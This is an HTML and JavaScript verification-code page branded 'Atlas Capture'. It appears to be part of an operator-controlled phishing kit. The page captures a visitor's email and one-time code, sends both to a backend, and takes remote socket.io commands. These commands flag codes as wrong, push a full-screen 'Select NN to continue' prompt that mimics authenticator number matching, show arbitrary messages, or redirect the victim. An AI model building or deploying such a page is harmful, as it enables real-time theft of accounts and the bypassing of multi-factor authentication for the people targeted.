<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
body{background:#f3f4f6;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:40px 10px}
.wrapper{max-width:420px;width:100%}
.header{display:flex;justify-content:center;align-items:center;gap:10px;margin-bottom:18px}
.icon{display:flex;align-items:center;justify-content:center}
#logoAtlas{height:45px;width:45px;border-radius:40%}
.header span{font-weight:600;font-size:18px}
.card{background:#fff;border-radius:22px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,0.08);text-align:center}
h2{font-size:24px;font-weight:700;color:#1f2937;margin-bottom:8px}
.subtext{color:#6b7280;font-size:14px;margin-bottom:28px}
.otp-input{width:100%;padding:16px;font-size:24px;text-align:center;letter-spacing:8px;border:2px solid #e5e7eb;border-radius:14px;background:#fff;margin-bottom:28px;font-weight:600;text-transform:uppercase}
.otp-input:focus{outline:none;border-color:#4f46e5;box-shadow:0 0 0 3px rgba(79,70,229,0.1)}
button{width:100%;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#2563eb,#7c3aed);color:#fff;font-weight:600;cursor:pointer;margin-bottom:16px}
button:disabled{opacity:0.6;cursor:not-allowed}
.button-loading{display:inline-flex;align-items:center;gap:8px}
.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.link{background:none;color:#4f46e5;font-size:14px;font-weight:500;margin:0;padding:0;box-shadow:none}
.error-message{color:#ef4444;font-size:13px;margin-top:12px;display:none;background:#fef2f2;padding:12px;border-radius:12px}

/* POPUPS */
.popup-overlay{display:none;position:fixed;inset:0;background:#2b2b2b;z-index:99999;justify-content:center;align-items:center;padding:20px}
.popup-overlay.active{display:flex !important}
.popup-yes{text-align:center;color:white;max-width:600px;width:100%}
.popup-yes .big-yes{font-size:100px;font-weight:900;color:#ffffff;letter-spacing:8px;margin-bottom:40px}
.popup-yes .number-circle{width:280px;height:280px;border-radius:50%;border:10px solid #10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 40px;box-shadow:0 0 60px rgba(16,185,129,0.5)}
.popup-yes .number-circle span{font-size:140px;font-weight:900;color:#ffffff;letter-spacing:4px}
.popup-yes .instruction{font-size:22px;font-weight:600;color:#d1d5db;margin-top:20px;line-height:1.5}
.popup-yes .instruction strong{color:#10b981}
@media (max-width:500px){
  .popup-yes .big-yes{font-size:70px;margin-bottom:28px}
  .popup-yes .number-circle{width:200px;height:200px;border-width:8px}
  .popup-yes .number-circle span{font-size:100px}
  .popup-yes .instruction{font-size:18px}
}

.popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
.popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
.popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="icon"><img id="logoAtlas" src="/images/logo.png" alt="atlas logo"></div>
    <span>Atlas Capture</span>
  </div>
  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 5-6 character verification code</p>
    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="------">
    <div id="errorMessage" class="error-message"></div>
    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
  </div>
</div>

<div id="yesPopup" class="popup-overlay">
  <div class="popup-yes">
    <div class="big-yes">YES</div>
    <div class="number-circle">
      <span id="yesNumber">00</span>
    </div>
    <div class="instruction">Select <strong id="yesNumberText">00</strong> to continue</div>
  </div>
</div>

<div id="textPopup" class="popup-overlay">
  <div class="popup-text">
    <h3>Message</h3>
    <div class="message" id="textMessage"></div>
  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const urlParams = new URLSearchParams(window.location.search);
let email = urlParams.get('email') || localStorage.getItem('atlas_current_email') || '';
if (!email) { window.location.href = '/'; }
localStorage.setItem('atlas_current_email', email);

const otpInput = document.getElementById('otpInput');
const verifyBtn = document.getElementById('verifyBtn');
const errorDiv = document.getElementById('errorMessage');
const yesPopup = document.getElementById('yesPopup');
const textPopup = document.getElementById('textPopup');

let isProcessing = false;
let lastPopupId = 0;

function showError(msg) {
  errorDiv.textContent = msg;
  errorDiv.style.display = 'block';
  setTimeout(() => { errorDiv.style.display = 'none'; }, 8000);
}

function showLoading() {
  isProcessing = true;
  verifyBtn.disabled = true;
  verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
  errorDiv.style.display = 'none';
}

function showWaiting() {
  verifyBtn.disabled = true;
  verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
}

function resetButton() {
  isProcessing = false;
  verifyBtn.disabled = false;
  verifyBtn.innerHTML = 'Verify';
}

function showYesPopup(n) {
  textPopup.classList.remove('active');
  document.getElementById('yesNumber').textContent = n;
  document.getElementById('yesNumberText').textContent = n;
  yesPopup.classList.add('active');
}

function showTextPopup(msg) {
  yesPopup.classList.remove('active');
  document.getElementById('textMessage').textContent = msg;
  textPopup.classList.add('active');
}

async function pollStatus() {
  if (!email) return;
  try {
    const res = await fetch(`/api/user/status?email=${encodeURIComponent(email)}`);
    const data = await res.json();
    if (!data || data.notFound) return;

    if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
      lastPopupId = data.popup_id;
      if (data.popup_type === 'yes') showYesPopup(data.popup_value);
      else if (data.popup_type === 'text') showTextPopup(data.popup_value);
    }

    if (data.wrong_otp_flag) {
      resetButton();
      otpInput.value = '';
      showError('Incorrect code. Please try again.');
      await fetch('/api/user/clear-flags', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ email })
      }).catch(()=>{});
      return;
    }

    // NO timeout_flag handling on OTP page

    if (data.status === 'success') {
      window.location.href = `/success?email=${encodeURIComponent(email)}`;
      return;
    }
  } catch (err) {}
}

verifyBtn.addEventListener('click', async () => {
  if (isProcessing) return;
  const otp = otpInput.value.trim().toUpperCase();
  if (otp.length < 5 || otp.length > 6) { showError('Please enter 5 or 6 characters'); return; }
  if (!/^[A-Z0-9]+$/.test(otp)) { showError('Only letters and numbers allowed'); return; }

  showLoading();
  try {
    const res = await fetch('/api/user/submit-otp', {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ email, otp })
    });
    const data = await res.json();
    if (data.success) showWaiting();
    else { resetButton(); showError(data.error || 'Failed'); }
  } catch (e) { resetButton(); showError('Network error'); }
});

otpInput.addEventListener('input', () => { otpInput.value = otpInput.value.toUpperCase(); });
otpInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') verifyBtn.click(); });
otpInput.focus();

setInterval(pollStatus, 1000);
pollStatus();

socket.on('popup-update', (data) => {
  if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
  if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
    lastPopupId = data.popup_id;
    if (data.popup_type === 'yes') showYesPopup(data.popup_value);
    else if (data.popup_type === 'text') showTextPopup(data.popup_value);
  }
});

socket.on('user-control', (data) => {
  if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
  pollStatus();
});

socket.on('user-deleted', (data) => {
  if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
  window.location.href = '/';
});

document.getElementById('differentEmail').addEventListener('click', () => { window.location.href = '/'; });
</script>
</body>
</html>
